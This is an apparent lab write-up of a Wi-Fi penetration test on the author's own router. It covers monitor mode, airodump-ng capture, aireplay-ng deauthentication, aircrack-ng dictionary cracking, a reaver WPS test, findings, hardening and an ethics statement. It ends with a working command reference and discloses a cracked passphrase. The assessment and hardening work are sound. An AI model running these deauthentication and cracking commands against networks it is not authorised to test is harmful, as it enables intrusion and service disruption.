🔍 Assessment Workflow

1. Interface Prep

Enabled monitor mode via airmon-ng, killed conflicting processes, verified adapter capability.

2. Passive Discovery

Ran airodump-ng to map nearby APs. Identified target SSID, encryption type, and connected clients.

3. Targeted Capture

Locked to target BSSID and channel. Captured beacon frames and waited for 4-way handshake.

4. Deauthentication

Used aireplay-ng -0 to force client reconnection and capture EAPOL frames.

5. Offline Cracking

Ran dictionary attack with aircrack-ng. Key found: Orijin@bitters

6. Remediation

Hardened router: WPA3-SAE, disabled WPS, enabled 802.11w PMF, strong admin password.

⚠️ Key Findings

ID Finding Severity CVSS 3.1
WIFI-001 Weak WPA2-PSK susceptible to dictionary attack High 7.5
WIFI-002 4-Way Handshake exposed to offline cracking High —
WIFI-003 No 802.11w (PMF) — deauth frames accepted Medium —

🔒 Remediation Applied

Control Before After
Wi-Fi Password Orijin@bitters (cracked) 20+ character random passphrase
Encryption WPA2-PSK WPA3-SAE / WPA2-AES only
WPS Enabled Disabled
802.11w (PMF) Not configured Required
Router Admin Password Default / weak Strong unique password
Remote Management Potentially enabled Disabled

Verification: Post-hardening re-capture and re-test confirmed the dictionary attack failed against the new passphrase, proving remediation effectiveness.

⚖️ Ethics & Compliance

All testing was conducted exclusively against equipment owned and operated by Adama Nuhu. The lab environment was physically isolated with no WAN/internet uplink. Neighboring networks detected during passive scanning were not subjected to any active testing, deauthentication, or intrusion attempts. This assessment adheres to the Nigerian Cybercrimes Act and ethical hacking best practices.

⌨️ Command Reference

# 1. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Passive network discovery
sudo airodump-ng wlan0mon

# 3. Targeted capture (replace CH and BSSID)
sudo airodump-ng -c 3 --bssid D8:50:A1:07:E9:FE -w Devil_Apprentice wlan0mon

# 4. Deauth to capture handshake (new terminal)
sudo aireplay-ng -0 11 -a D8:50:A1:07:E9:FE -c <CLIENT_MAC> wlan0mon

# 5. Crack handshake with corrected syntax
sudo aircrack-ng -a2 -b D8:50:A1:07:E9:FE -w wifi_crack.txt Devil_Apprentice-02.cap

# 6. WPS test (if applicable)
sudo reaver -i wlan0mon -b D8:50:A1:07:E9:FE -vv
